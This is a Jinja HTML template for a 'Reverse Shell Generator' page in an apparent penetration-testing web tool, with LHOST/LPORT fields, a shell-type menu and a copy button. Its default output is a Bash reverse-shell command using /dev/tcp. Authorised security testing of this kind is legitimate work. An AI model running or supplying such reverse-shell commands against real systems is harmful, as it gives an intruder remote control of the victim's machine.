{% extends 'base.html' %}

{% block content %}
<div class="row">
    <div class="col-md-12">
        <div class="card shadow-sm bg-dark border-secondary">
            <div class="card-header border-secondary p-3">
                <h5 class="card-title mb-0"><i class="fas fa-terminal me-2 text-info"></i>Reverse Shell Generator</h5>
            </div>
            <div class="card-body text-light">
                <div class="row g-3">
                    <div class="col-md-4">
                        <label class="small opacity-75 mb-1">LHOST</label>
                        <input type="text" id="lhost" class="form-control pentest-input" placeholder="127.0.0.1">
                    </div>
                    <div class="col-md-2">
                        <label class="small opacity-75 mb-1">LPORT</label>
                        <input type="text" id="lport" class="form-control pentest-input" placeholder="4444">
                    </div>
                    <div class="col-md-6">
                        <label class="small opacity-75 mb-1">Type</label>
                        <select id="shell-type" class="form-select pentest-input">
                            <option value="bash">Bash (-i)</option>
                            <option value="python">Python</option>
                            <option value="php">PHP</option>
                            <option value="nc">Netcat (Traditional)</option>
                            <option value="ps">PowerShell</option>
                        </select>
                    </div>
                    <div class="col-12 mt-3">
                        <div class="position-relative">
                            <pre id="shell-output" class="p-3 bg-black border border-secondary rounded text-info" style="min-height: 60px; cursor: pointer;">bash -i >& /dev/tcp/127.0.0.1/4444 0>&1</pre>
                            <button class="btn btn-sm btn-outline-info position-absolute top-0 end-0 m-2" onclick="copyToClipboard('shell-output')">
                                <i class="fas fa-copy"></i>
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>

<style>
    .pentest-input {
        background-color: #ced4da !important;
        color: #000000 !important;
        border: 1px solid #adb5bd !important;
    }
    .pentest-input::placeholder {
        color: #495057 !important;
        opacity: 0.8;
    }
    .pentest-input:focus {
        background-color: #e9ecef !important;
        color: #000000 !important;
        box-shadow: 0 0 0 0.25rem rgba(88, 166, 255, 0.25) !important;
    }
</style>
{% endblock %}
